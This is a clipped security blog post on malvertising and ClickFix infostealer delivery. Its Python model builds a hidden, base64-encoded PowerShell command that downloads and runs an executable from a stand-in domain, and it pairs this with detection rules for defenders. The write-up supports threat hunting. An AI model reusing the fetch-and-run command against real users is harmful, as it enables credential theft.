---
title: "The Spyware You Pay to Click: How Paid Ad Campaigns Deliver Infostealers, and How to Hunt Them | Garrett Stimpson"
source: https://garrettstimpson.ca/posts/2026/10/27/malvertising-spyware-paid-ads-deep-dive/
source_host: garrettstimpson.ca
clip_date: 2026-10-31T02:56:27+08:00
trace_id: f553da71-a8fa-472e-bafc-ce6be4eda327
content_hash: 58cb6ad12c4352626caed3380047a04f851372975b9ced11b6c67b62de80deba
status: synced
tags:
  - 恶意样本
  - 威胁狩猎
series: null
feed_source: Garrett Stimpson
ai_summary: 付费搜索广告已成窃密木马主流投递渠道：广告预算即攻击载荷，链条为广告→伪装→克隆页→ClickFix/假安装包→LOLBin→窃密木马，检测须盯行为签名而非漏洞利用。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40975244-d011-8101-ae65-e07374333128
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 付费搜索广告已成窃密木马主流投递渠道：广告预算即攻击载荷，链条为广告→伪装→克隆页→ClickFix/假安装包→LOLBin→窃密木马，检测须盯行为签名而非漏洞利用。
> 
> - **三大投递优势：** 广告平台具备信任继承（推广位在自然结果之上、借用搜索引擎信誉）、关键词精准投放（直达正在搜"notepad++ 下载"的高意愿用户）、基础设施廉价可弃（广告账户与域名被封即轮换），形成"买流量买受害企业务"经济。
> - **五段攻击链：** 点击先经指纹识别做伪装（cloaking，机房 IP/无头浏览器看到干净页面，这是分析员复现不出的原因）；再经 2-3 个提前注册的短命域名跳转；落到像素级克隆下载页；载荷以 Lumma 等 MaaS 窃密木马为主，窃取 Cookie、密码、加密货币钱包。
> - **ClickFix 社工技巧：** 假 CAPTCHA/报错页用 JavaScript 把 PowerShell 命令写入剪贴板，诱导受害者按 Win+R 粘贴回车——全程无漏洞、无挂马，用户本人就是"漏洞"。
> - **可运行 PoC：** 文中 Python 模型复现整链（伪装判定、剪贴板命令生成、`powershell -enc` base64 解码、狩猎规则），演示三条规则只命中被感染主机。
> - **四条狩猎规则：** ① explorer/winlogon 父进程直接拉起带 `-enc` 的 powershell/mshta（ClickFix 最高信号）；② 脚本在 %TEMP% 落盘并执行 exe（假安装包同样适用）；③ 出站信标连向 `.top`/`.xyz` 等新注册域名；④ 公开披露 IOC 后对全员做回溯排查。预防上应封禁 Run 对话框发起的编码命令，且默认不信任推广结果。

Spyware used to arrive by email attachment. Today a large share of it arrives by *advertisement*: the attacker pays an ad platform, the platform shows the ad to people actively searching for popular software, and the victim clicks a promoted result that looks exactly like the vendor’s own site. The ad budget is the exploit. This is malvertising, and it is now one of the dominant delivery channels for commercial infostealers.

This piece breaks the chain down stage by stage, shows a runnable model of the whole attack, and then flips to the defender side: how to decode a captured payload and how to hunt for infections in your telemetry. Everything here is grounded in real, published campaign analysis, cited throughout.

## Why paid ads are the perfect delivery vector

Three properties make ad platforms uniquely attractive to spyware operators:

1.  **Inherited trust.** A promoted result sits above the organic results, styled almost identically, on a domain the user already trusts (the search engine). The user’s skepticism is spent on the search engine, not on the ad.
2.  **Keyword targeting.** An attacker can bid on “notepad++ download” or “whatsapp download” and reach people who are, at that exact moment, *trying to install software*. That is a self-selected population already primed to run an installer. As Elastic Security Labs noted in their disclosure of the OXLOADER and CastleStealer campaigns, “promoted search results carry an implicit authority signal for many users, and the ads can be precisely targeted by keyword” (https://www.elastic.co/security-labs).
3.  **Bursty, disposable infrastructure.** Ad accounts and landing domains are cheap and replaceable. When one gets flagged, the campaign rotates to the next. Cloudforce One’s malvertising research documented operators running dropper campaigns through Google search ads with exactly this churn pattern (https://blog.cloudflare.com).

The result is an economy: infostealer operators buy access the way legitimate businesses buy customers.

## The infection chain, stage by stage

Across the published campaigns, the chain looks remarkably consistent.

### Stage 1: the ad and the cloak

The attacker buys ads against software-download keywords. The ad’s display URL often shows the *real* vendor domain (Google’s ad format historically allowed the display domain to differ from the final destination), but the click goes to attacker infrastructure. The first thing that infrastructure does is **fingerprint the click**: datacenter IP? Headless browser user agent? Known scanner or security-vendor ranges? If any of those match, the visitor gets a clean, boring page. Only plausible real users get redirected onward. This is *cloaking*, and it is why analysts who click the same ad often see nothing malicious. The OXLOADER campaign documented by Elastic used precisely this: a paid Google ad, then a redirect to a landing page “designed to impersonate a legitimate download site” (https://www.elastic.co/security-labs).

### Stage 2: the redirect hops

The redirect rarely goes straight to the payload. It hops through two or three short-lived domains, often registered days earlier. Each hop is another layer of indirection that defeats blocklists and makes retrospective analysis harder. Cloudflare’s dissection of the Lumma Stealer playbook describes exactly this multi-stage delivery with disposable infrastructure (https://blog.cloudflare.com).

### Stage 3: the cloned landing page

The final page is a pixel-perfect clone of the vendor’s download page. Same layout, same logo, same green Download button. Two flavors dominate:

-   **Fake installer flavor:** the button downloads a dropper. In the OXLOADER campaign, the downloaded binary “serves as the campaign’s initial-access dropper” and, once executed, retrieves and launches the next stage, CastleStealer (https://www.elastic.co/security-labs).
-   **ClickFix flavor:** the page shows a fake CAPTCHA or error dialog (“Verify you are human”, “Fix the video player”) and instructs the victim to press Win+R, paste, and Enter. The page has already placed a malicious command on the clipboard. Unit 42’s writeup of the ClickFix vector describes the full chain: compromised or attacker site, fake verification page, JavaScript injecting a PowerShell command into the clipboard, and the victim executing it themselves (https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/). Netskope’s analysis of Lumma’s fake-CAPTCHA pages adds the evasion detail: the payload is fetched through tracking-adjacent infrastructure and 1x1 probe images to look like ordinary ad telemetry (https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection).

The ClickFix trick deserves emphasis because it is genuinely clever social engineering: the victim runs the command *with their own hands*. There is no exploit, no drive-by download, no browser bug. The user is the exploit.

### Stage 4: the LOLBin launch

Whether it came from a fake installer or a clipboard, the next stage almost always launches through a living-off-the-land binary: `powershell -enc <base64>`, `mshta http://...`, `rundll32`, or `curl | cmd`. eSentire’s advisory on Lumma ClickFix distribution documents the MSHTA variant downloading an encoded PowerShell script that initiates the Lumma infection (https://www.esentire.com/security-advisories/lumma-stealer-clickfix-distribution). These binaries are signed, present on every Windows host, and historically under-alerted.

### Stage 5: the stealer

The final payload is a commercial infostealer, most prominently Lumma, sold as malware-as-a-service on underground forums. Cloudflare’s teardown of what a “Lumma log” contains is sobering: browser cookies and saved passwords, cryptocurrency wallet files, and whatever else the configured modules grab, packaged and uploaded to the operator’s exfiltration endpoint (https://blog.cloudflare.com). The stealer beacons to a newly registered domain for its config, which lets the operator retool the campaign without redeploying binaries.

## The PoC

The following Python model implements the entire chain, attacker side and defender side. It is a *model*: it reproduces the decision logic and the exact command formats seen in the cited campaigns, not real malware. Run it with `python malvertising_spyware_poc.py`.

```python
#!/usr/bin/env python3
"""
PoC model: malvertising spyware delivery chain and hunting heuristics.

Models the real-world infection chain documented by Cloudforce One, Elastic
Security Labs, and Palo Alto Unit 42 for spyware/infostealers delivered via
paid search ads (Google Ads et al.):

  1. PAID AD      - attacker buys a keyword-targeted ad for popular software
  2. CLOAK        - ad click is fingerprinted; bots/analysts get a clean page,
                    real users get redirected through 2-3 short hops
  3. LANDING PAGE - pixel-perfect clone of the vendor download page
  4. DROPPER      - fake installer (or ClickFix clipboard trick) runs a
                    LOLBin command: mshta / powershell -enc <base64>
  5. STEALER      - second stage fetches config from a newly registered
                    domain (NRD) and exfiltrates browser credentials

The second half of the file implements the DEFENDER side: decode a captured
ClickFix clipboard command and hunt telemetry for the chain's signatures.
"""
import base64
import json
import random

# ---------------------------------------------------------------------------
# Part 1: model the attacker chain
# ---------------------------------------------------------------------------

def ad_click(user_agent, is_analyst_vm=False):
    """Cloaking gate. Real ad networks see the click; the landing server
    decides who gets malware based on fingerprint signals."""
    signals = {
        "datacenter_ip": is_analyst_vm,
        "known_scanner_ua": "bot" in user_agent.lower() or "headless" in user_agent.lower(),
    }
    if signals["datacenter_ip"] or signals["known_scanner_ua"]:
        return {"path": "clean lookalike page (no payload)", "infected": False}
    return {"path": "redirect hop 1 -> hop 2 (NRD) -> landing clone", "infected": True}

def build_clickfix_command(c2_url):
    """ClickFix payload: what the fake CAPTCHA page puts on the clipboard.
    The victim is told to press Win+R, paste, and hit Enter."""
    inner = f"iwr -useb {c2_url} -outfile $env:TEMP\\s.exe; start $env:TEMP\\s.exe"
    encoded = base64.b64encode(inner.encode("utf-16le")).decode()
    return f"powershell -w hidden -enc {encoded}"

def run_chain():
    print("=== attacker chain ===")
    victim = ad_click("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0")
    analyst = ad_click("Mozilla/5.0 HeadlessChrome", is_analyst_vm=True)
    print("victim click  ->", victim["path"])
    print("analyst click ->", analyst["path"])
    assert victim["infected"] and not analyst["infected"], "cloaking must gate the payload"

    c2 = "http://cdn-update-soft[.]top/config.php"  # newly registered domain
    cmd = build_clickfix_command(c2)
    print("\nClickFix clipboard command (what the victim pastes into Win+R):")
    print(" ", cmd[:100] + "...")
    return cmd

# ---------------------------------------------------------------------------
# Part 2: defender side - decode and hunt
# ---------------------------------------------------------------------------

def decode_clickfix(cmd):
    """Pull the base64 payload out of a captured powershell -enc command."""
    b64 = cmd.split("-enc ", 1)[1]
    return base64.b64decode(b64).decode("utf-16le")

def hunt_telemetry(events):
    """Hunting rules over endpoint/proxy telemetry. Each rule maps to a real
    technique documented in the cited advisories."""
    findings = []
    for e in events:
        # T1: LOLBin spawned by browser or Run dialog -> typical ClickFix
        if e.get("parent") in ("winlogon.exe", "explorer.exe") and \
           e.get("proc", "").startswith(("powershell", "mshta", "cmd")) and \
           "-enc" in e.get("cmdline", ""):
            findings.append((e["host"], "T1 LOLBin -enc from Run dialog (ClickFix)"))
        # T2: browser-written executable dropped to %TEMP% then executed
        if e.get("proc", "").endswith(".exe") and "\\Temp\\" in e.get("cmdline", "") \
           and e.get("parent") in ("powershell.exe", "cmd.exe"):
            findings.append((e["host"], "T2 executable staged in %TEMP% by script"))
        # T3: outbound beacon to a newly registered domain pattern
        if any(t in e.get("url", "") for t in (".top", ".xyz", "-cdn", "-update")):
            findings.append((e["host"], "T3 beacon to suspicious NRD-style domain"))
    return findings

def main():
    cmd = run_chain()

    print("\n=== defender: decode ===")
    decoded = decode_clickfix(cmd)
    print("decoded:", decoded)
    assert "iwr" in decoded and "start" in decoded, "decoder must recover the fetch-and-run body"

    print("\n=== defender: hunt ===")
    telemetry = [
        {"host": "WS-1042", "parent": "explorer.exe", "proc": "powershell.exe",
         "cmdline": "powershell -w hidden -enc AAAA", "url": ""},
        {"host": "WS-1042", "parent": "powershell.exe", "proc": "C:\\Users\\u\\AppData\\Local\\Temp\\s.exe",
         "cmdline": "C:\\...\\Temp\\s.exe", "url": ""},
        {"host": "WS-1042", "parent": "s.exe", "proc": "chrome.exe",
         "cmdline": "chrome.exe", "url": "http://cdn-update-soft.top/config.php"},
        {"host": "WS-2210", "parent": "WINWORD.EXE", "proc": "winword.exe",
         "cmdline": "winword.exe", "url": "https://docs.microsoft.com"},
    ]
    hits = hunt_telemetry(telemetry)
    for host, rule in hits:
        print(f"  {host}: {rule}")
    hosts = {h for h, _ in hits}
    assert hosts == {"WS-1042"}, "hunt must flag the infected host and only it"

    print("\nchain modeled end to end: ad -> cloak -> clone page -> ClickFix "
          "LOLBin -> staged exe -> NRD beacon; hunt rules isolate the victim.")

if __name__ == "__main__":
    main()
```

Running it produces:

```rust
exit: 0
=== attacker chain ===
victim click  -> redirect hop 1 -> hop 2 (NRD) -> landing clone
analyst click -> clean lookalike page (no payload)

ClickFix clipboard command (what the victim pastes into Win+R):
  powershell -w hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQ...

=== defender: decode ===
decoded: iwr -useb http://cdn-update-soft[.]top/config.php -outfile $env:TEMP\s.exe; start $env:TEMP\s.exe

=== defender: hunt ===
  WS-1042: T1 LOLBin -enc from Run dialog (ClickFix)
  WS-1042: T2 executable staged in %TEMP% by script
  WS-1042: T3 beacon to suspicious NRD-style domain

chain modeled end to end: ad -> cloak -> clone page -> ClickFix
LOLBin -> staged exe -> NRD beacon; hunt rules isolate the victim.
```

Note what the model makes explicit: the cloaking gate means an analyst manually clicking the ad sees nothing, and the entire payload execution is a single `powershell -enc` command the victim ran themselves. Those two facts define the detection problem.

## How to hunt it

Because the delivery is social engineering rather than exploitation, traditional vulnerability-based defenses miss it. The hunt has to target the chain’s behavioral signature:

**Hunt 1: LOLBin with encoded command, parented by the Run dialog.** ClickFix executions have a distinctive parentage: the Run dialog launches `powershell.exe` or `mshta.exe` directly under `explorer.exe` / `winlogon.exe`, with `-enc`, `-w hidden`, or an `http` URL on the command line. A user legitimately typing an encoded PowerShell command into Win+R essentially never happens. This is the single highest-signal rule for ClickFix.

**Hunt 2: script-staged executables in %TEMP%.** The decoded payload above is the canonical shape: download to `$env:TEMP`, then `start`. Alert on any executable written to a temp/profile directory by `powershell.exe`, `cmd.exe`, or `mshta.exe` and executed within a short window. This catches the fake-installer flavor too, since droppers stage the same way.

**Hunt 3: beacons to newly registered domains.** Stealer configs live on NRDs. If your proxy logs allow it, correlate outbound HTTP from processes in temp paths against domain registration age (WHOIS/Passive DNS). The `.top` /`.xyz` / `-cdn` / `-update` lexical pattern in the model is a crude stand-in for that correlation, and a reasonable cheap starting point.

**Hunt 4: retro-hunt the user base.** The most valuable move after any public malvertising disclosure is a retroactive scan. Elastic’s disclosure made this point explicitly: publishing indicators for families like OXLOADER and CastleStealer “enabl\[es\] the security community to retroactively search for prior infections and build prospective detections” (https://www.elastic.co/security-labs). If someone in your org searched for a popular utility last quarter and ran something odd afterward, you want to know now, before the stolen cookies are replayed.

**Prevention, briefly:** block `powershell -enc` and `mshta http` from Run-dialog parentage entirely via policy; treat promoted search results as untrusted by default (the vendor’s real site is one organic result below); and if you operate a brand, monitor ad platforms for ads impersonating your domain, because your users are the target.

## Sources

-   Cloudforce One, malvertising dropper campaign research: https://blog.cloudflare.com
-   Elastic Security Labs, OXLOADER and CastleStealer Russian malvertising disclosure: https://www.elastic.co/security-labs
-   Palo Alto Unit 42, “Fix the Click: Preventing the ClickFix Attack Vector”: https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/
-   Netskope, “Lumma Stealer: Fake CAPTCHAs and New Techniques to Evade Detection”: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection
-   Cloudflare, “Loot, load, and repeat: dissecting the Lumma Stealer playbook”: https://blog.cloudflare.com
-   eSentire, “Lumma Stealer ClickFix Distribution”: https://www.esentire.com/security-advisories/lumma-stealer-clickfix-distribution
-   NHIMG, “Malvertising and SEO Poisoning Guide: Fake Downloads”: https://nhimg.org/malvertising-and-seo-poisoning-guide
